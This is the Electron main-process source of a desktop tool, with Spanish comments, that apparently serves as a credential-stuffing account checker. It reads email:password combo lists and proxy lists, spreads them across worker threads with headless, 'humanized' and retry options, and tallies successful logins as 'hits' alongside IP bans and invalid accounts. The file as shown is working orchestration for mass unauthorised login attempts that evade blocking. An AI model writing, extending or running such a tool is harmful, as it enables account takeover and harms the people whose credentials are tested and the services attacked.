const { app, BrowserWindow, ipcMain, dialog } = require('electron');
const { Worker } = require('worker_threads');
const path = require('path');
const fs = require('fs');

let hits = 0;
let bans = 0;
let invalids = 0;
let workers = [];
let isRunning = false;
let mainWindow;

// Función para leer archivos de forma asíncrona
async function readFileAsync(filePath) {
    return fs.promises.readFile(filePath, 'utf-8');
}

// Función para leer credenciales
async function readCredentials(filePath) {
    const content = await readFileAsync(filePath);
    return content.split('\n')
        .filter(line => line.includes(':') && line.split(':').length === 2)
        .map(line => {
            const [email, password] = line.split(':');
            return { email: email.trim(), password: password.trim() };
        });
}

// Función para leer proxies
async function readProxies(filePath) {
    const content = await readFileAsync(filePath);
    return content.split('\n').filter(Boolean);
}

// Función para enviar logs a la interfaz
function sendLogToRenderer(message) {
    if (mainWindow) {
        mainWindow.webContents.send('log-message', message);
    }
}

// Sobrescribir console.log y console.error para enviar mensajes al frontend
function overrideConsole() {
    const originalLog = console.log;
    console.log = (...args) => {
        sendLogToRenderer(args.join(' '));
        originalLog.apply(console, args);
    };

    const originalError = console.error;
    console.error = (...args) => {
        sendLogToRenderer(args.join(' '));
        originalError.apply(console, args);
    };
}

// Crear la ventana de la aplicación
function createWindow() {
    mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            preload: path.join(__dirname, 'preload.js'),
            nodeIntegration: true,
            contextIsolation: false,
        },
    });

    mainWindow.loadFile('index.html');

    mainWindow.on('close', async (e) => {
        if (isRunning) {
            e.preventDefault();

            if (workers.length > 0) {
                await Promise.all(workers.map(worker => new Promise((resolve) => {
                    worker.once('exit', resolve);
                    worker.postMessage('stop');
                })));
                workers = [];
            }

            isRunning = false;
            mainWindow.destroy();
        } else {
            app.quit();
        }
    });
}

// Función para iniciar los workers
async function startWorkers({ useProxies, retryOnFail, useHeadless, numWorkers, humanizedMode, credentialsPath, proxiesPath }) {
    const credentials = await readCredentials(credentialsPath);
    const proxies = useProxies ? await readProxies(proxiesPath) : [];

    for (let i = 0; i < numWorkers; i++) {
        const workerPath = path.join(__dirname, 'worker.js');
        const worker = new Worker(workerPath, {
            workerData: {
                credentials: credentials.slice(i * credentials.length / numWorkers, (i + 1) * credentials.length / numWorkers),
                proxies,
                useProxies,
                retryOnFail,
                useHeadless,
                humanizedMode
            }
        });

        worker.on('message', (message) => {
            console.log(`Worker ${i}: ${message}`);
            handleWorkerMessage(message);
        });

        worker.on('error', (error) => {
            console.error(`Worker ${i} error:`, error);
        });

        worker.on('exit', (code) => {
            if (code !== 0) {
                console.error(`Worker ${i} stopped with exit code ${code}`);
            }
        });

        workers.push(worker);
    }

    isRunning = true;
}

// Manejo de mensajes recibidos de los workers
function handleWorkerMessage(message) {
    if (message.includes('Inicio de sesión exitoso')) {
        hits++;
    } else if (message.includes('TimeoutError detectado') || message.includes('IP bloqueada')) {
        bans++;
    } else if (message.includes('El correo no está registrado.') || message.includes('Contraseña incorrecta. Cerrando navegador.')) {
        invalids++;
    }
    updateStats();
}

// Función para detener los workers
function stopWorkers() {
    workers.forEach(worker => worker.postMessage('stop'));
    workers = [];
    isRunning = false;
}

// Función para pausar los workers
function pauseWorkers() {
    workers.forEach(worker => worker.postMessage('pause'));
}

// Función para reanudar los workers
function resumeWorkers() {
    workers.forEach(worker => worker.postMessage('resume'));
}

// Función para actualizar las estadísticas en la interfaz
function updateStats() {
    if (mainWindow) {
        mainWindow.webContents.send('update-stats', { hits, bans, invalids });
    }
}

// Función para manejar la selección de archivos
function handleFileSelection(event, filter, replyChannel) {
    dialog.showOpenDialog({
        properties: ['openFile'],
        filters: [filter]
    }).then(result => {
        if (!result.canceled && result.filePaths.length > 0) {
            event.reply(replyChannel, result.filePaths[0]);
        } else {
            event.reply(replyChannel, null);
        }
    }).catch(err => {
        console.error(`Error al seleccionar archivo: ${err.message}`);
        event.reply(replyChannel, null);
    });
}

// Eventos de IPC para manejar la interfaz
ipcMain.on('start', async (event, data) => {
    if (!isRunning) {
        await startWorkers(data);
    }
});

ipcMain.on('stop', stopWorkers);
ipcMain.on('pause', pauseWorkers);
ipcMain.on('resume', resumeWorkers);

ipcMain.on('select-credentials', (event) => {
    handleFileSelection(event, { name: 'Text Files', extensions: ['txt'] }, 'selected-credentials');
});

ipcMain.on('select-proxies', (event) => {
    handleFileSelection(event, { name: 'Text Files', extensions: ['txt'] }, 'selected-proxies');
});

// Iniciar la aplicación de Electron
app.whenReady().then(() => {
    overrideConsole();
    createWindow();

    app.on('activate', () => {
        if (BrowserWindow.getAllWindows().length === 0) {
            createWindow();
        }
    });
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});
